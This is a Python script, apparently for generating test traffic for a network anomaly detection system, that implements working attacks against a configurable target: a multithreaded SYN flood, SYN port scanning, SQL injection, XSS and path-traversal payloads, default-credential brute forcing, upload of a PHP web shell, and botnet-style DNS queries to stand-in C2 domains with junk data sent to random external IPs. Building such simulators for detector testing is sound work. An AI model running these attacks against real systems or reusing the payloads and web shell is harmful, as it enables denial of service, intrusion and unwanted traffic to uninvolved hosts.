#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Network Attack Simulator
For testing deep learning network traffic anomaly detection system
网络攻击模拟器 - 用于测试深度学习网络流量异常检测系统
"""

import socket
import threading
import time
import random
import requests
import subprocess
import sys
from scapy.all import *
from scapy.layers.inet import IP, TCP, UDP, ICMP
import argparse

class AttackSimulator:
    def __init__(self, target_ip="127.0.0.1", target_port=8000):
        self.target_ip = target_ip
        self.target_port = target_port
        self.running = False

    def dos_attack(self, duration=30):
        """Simulate DoS attack / 模拟DoS攻击"""
        print(f"[DoS Attack] Starting DoS attack on {self.target_ip}:{self.target_port} for {duration} seconds")
        self.running = True
        start_time = time.time()

        def send_requests():
            while self.running and (time.time() - start_time) < duration:
                try:
                    # TCP SYN Flood
                    for _ in range(10):
                        src_port = random.randint(1024, 65535)
                        packet = IP(dst=self.target_ip)/TCP(sport=src_port, dport=self.target_port, flags="S")
                        send(packet, verbose=0)
                    time.sleep(0.1)
                except Exception as e:
                    print(f"DoS attack error: {e}")

        # Start multiple threads for attack / 启动多个线程进行攻击
        threads = []
        for i in range(5):
            t = threading.Thread(target=send_requests)
            t.start()
            threads.append(t)

        time.sleep(duration)
        self.running = False

        for t in threads:
            t.join()

        print("[DoS Attack] Attack completed")

    def port_scan(self, start_port=1, end_port=1000):
        """Simulate port scanning attack / 模拟端口扫描攻击"""
        print(f"[Port Scan] Starting port scan on {self.target_ip} ports {start_port}-{end_port}")

        def scan_port(port):
            try:
                # TCP SYN scan / TCP SYN扫描
                response = sr1(IP(dst=self.target_ip)/TCP(dport=port, flags="S"), timeout=1, verbose=0)
                if response and response.haslayer(TCP):
                    if response[TCP].flags == 18:  # SYN-ACK
                        print(f"Port {port} is open")
                        # Send RST to close connection / 发送RST关闭连接
                        send(IP(dst=self.target_ip)/TCP(dport=port, flags="R"), verbose=0)
            except Exception as e:
                pass

        # Randomly scan ports to simulate real attack / 随机扫描端口以模拟真实攻击
        ports = random.sample(range(start_port, end_port + 1), min(100, end_port - start_port + 1))

        for port in ports:
            scan_port(port)
            time.sleep(0.1)  # Avoid scanning too fast / 避免过快扫描

        print("[Port Scan] Scan completed")

    def web_attack(self, duration=20):
        """Simulate Web attack / 模拟Web攻击"""
        print(f"[Web Attack] Starting Web attack on http://{self.target_ip}:{self.target_port} for {duration} seconds")

        # Common Web attack payloads / 常见的Web攻击载荷
        payloads = [
            "' OR '1'='1",  # SQL injection / SQL注入
            "<script>alert('XSS')</script>",  # XSS
            "../../../etc/passwd",  # Path traversal / 路径遍历
            "<?php system($_GET['cmd']); ?>",  # PHP code injection / PHP代码注入
            "admin' --",  # SQL injection / SQL注入
            "<img src=x onerror=alert(1)>",  # XSS
        ]

        start_time = time.time()

        while (time.time() - start_time) < duration:
            try:
                # Randomly select attack payload / 随机选择攻击载荷
                payload = random.choice(payloads)

                # Construct malicious requests / 构造恶意请求
                urls = [
                    f"http://{self.target_ip}:{self.target_port}/admin/",
                    f"http://{self.target_ip}:{self.target_port}/login/",
                    f"http://{self.target_ip}:{self.target_port}/search?q={payload}",
                    f"http://{self.target_ip}:{self.target_port}/user?id={payload}",
                ]

                url = random.choice(urls)

                # Send malicious request / 发送恶意请求
                headers = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                    'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                }

                response = requests.get(url, headers=headers, timeout=5)
                print(f"Web attack request: {url} - Status code: {response.status_code}")

            except Exception as e:
                print(f"Web attack error: {e}")

            time.sleep(random.uniform(0.5, 2.0))

        print("[Web Attack] Attack completed")

    def bot_simulation(self, duration=25):
        """Simulate botnet behavior / 模拟僵尸网络行为"""
        print(f"[Botnet] Starting botnet behavior simulation for {duration} seconds")

        start_time = time.time()

        def bot_behavior():
            while (time.time() - start_time) < duration:
                try:
                    # Simulate C&C communication / 模拟C&C通信
                    fake_c2_servers = [
                        "malicious-c2.com",
                        "evil-command.net",
                        "bot-control.org"
                    ]

                    # Random DNS queries / 随机DNS查询
                    for server in fake_c2_servers:
                        try:
                            # Simulate DNS query / 模拟DNS查询
                            packet = IP(dst="8.8.8.8")/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname=server))
                            send(packet, verbose=0)
                        except:
                            pass

                    # Simulate data exfiltration / 模拟数据泄露
                    data_size = random.randint(1024, 10240)
                    fake_data = "A" * data_size

                    try:
                        # Simulate sending data externally / 模拟向外发送数据
                        external_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                        packet = IP(dst=external_ip)/TCP(dport=443)/Raw(load=fake_data)
                        send(packet, verbose=0)
                    except:
                        pass

                    time.sleep(random.uniform(2, 5))

                except Exception as e:
                    print(f"Botnet simulation error: {e}")

        # Start multiple botnet threads / 启动多个僵尸网络线程
        threads = []
        for i in range(3):
            t = threading.Thread(target=bot_behavior)
            t.start()
            threads.append(t)

        time.sleep(duration)

        for t in threads:
            t.join()

        print("[Botnet] Simulation completed")

    def infiltration_attack(self, duration=15):
        """Simulate infiltration attack / 模拟渗透攻击"""
        print(f"[Infiltration] Starting infiltration attack simulation for {duration} seconds")

        start_time = time.time()

        while (time.time() - start_time) < duration:
            try:
                # Simulate various penetration techniques / 模拟多种渗透技术

                # 1. Brute force attack / 暴力破解
                usernames = ["admin", "root", "user", "test", "guest"]
                passwords = ["123456", "password", "admin", "root", "test"]

                for username in usernames[:2]:  # Limit quantity / 限制数量
                    for password in passwords[:2]:
                        try:
                            login_data = {
                                'username': username,
                                'password': password
                            }
                            response = requests.post(
                                f"http://{self.target_ip}:{self.target_port}/admin/login/",
                                data=login_data,
                                timeout=3
                            )
                            print(f"Brute force attempt: {username}:{password} - Status: {response.status_code}")
                        except:
                            pass

                # 2. Simulate file upload attack / 模拟文件上传攻击
                try:
                    files = {'file': ('shell.php', '<?php system($_GET["cmd"]); ?>', 'application/x-php')}
                    response = requests.post(
                        f"http://{self.target_ip}:{self.target_port}/upload/",
                        files=files,
                        timeout=3
                    )
                except:
                    pass

                time.sleep(2)

            except Exception as e:
                print(f"Infiltration attack error: {e}")

        print("[Infiltration] Attack completed")

def generate_normal_traffic(target_ip="127.0.0.1", target_port=8000, duration=60):
    """Generate normal traffic / 生成正常流量"""
    print(f"[Normal Traffic] Starting normal traffic generation for {duration} seconds")

    start_time = time.time()

    while (time.time() - start_time) < duration:
        try:
            # Simulate normal HTTP requests / 模拟正常的HTTP请求
            normal_urls = [
                f"http://{target_ip}:{target_port}/",
                f"http://{target_ip}:{target_port}/admin/",
                f"http://{target_ip}:{target_port}/static/css/base.css",
                f"http://{target_ip}:{target_port}/static/js/jquery.min.js",
            ]

            url = random.choice(normal_urls)
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }

            response = requests.get(url, headers=headers, timeout=5)
            print(f"Normal request: {url} - Status code: {response.status_code}")

            # Normal interval / 正常间隔
            time.sleep(random.uniform(3, 8))

        except Exception as e:
            print(f"Normal traffic generation error: {e}")
            time.sleep(1)

    print("[Normal Traffic] Generation completed")

def main():
    parser = argparse.ArgumentParser(description='Network Attack Simulator')
    parser.add_argument('--target', default='127.0.0.1', help='Target IP address')
    parser.add_argument('--port', type=int, default=8000, help='Target port')
    parser.add_argument('--attack', choices=['dos', 'scan', 'web', 'bot', 'infiltration', 'all'],
                       default='all', help='Attack type')
    parser.add_argument('--normal', action='store_true', help='Generate normal traffic simultaneously')

    args = parser.parse_args()

    simulator = AttackSimulator(args.target, args.port)

    print("=" * 60)
    print("Network Attack Simulator Started")
    print(f"Target: {args.target}:{args.port}")
    print("=" * 60)

    # Start normal traffic generation (if specified) / 启动正常流量生成（如果指定）
    if args.normal:
        normal_thread = threading.Thread(
            target=generate_normal_traffic,
            args=(args.target, args.port, 120)
        )
        normal_thread.start()

    # Execute attacks / 执行攻击
    if args.attack == 'dos':
        simulator.dos_attack()
    elif args.attack == 'scan':
        simulator.port_scan()
    elif args.attack == 'web':
        simulator.web_attack()
    elif args.attack == 'bot':
        simulator.bot_simulation()
    elif args.attack == 'infiltration':
        simulator.infiltration_attack()
    elif args.attack == 'all':
        # Execute all attacks in sequence / 依次执行所有攻击
        print("\nStarting complete attack sequence...")
        time.sleep(2)

        simulator.port_scan(1, 100)
        time.sleep(3)

        simulator.web_attack(15)
        time.sleep(3)

        simulator.dos_attack(20)
        time.sleep(3)

        simulator.bot_simulation(15)
        time.sleep(3)

        simulator.infiltration_attack(10)

    print("\n" + "=" * 60)
    print("Attack simulation completed! Please check the detection system logs and reports.")
    print("=" * 60)

if __name__ == "__main__":
    main()
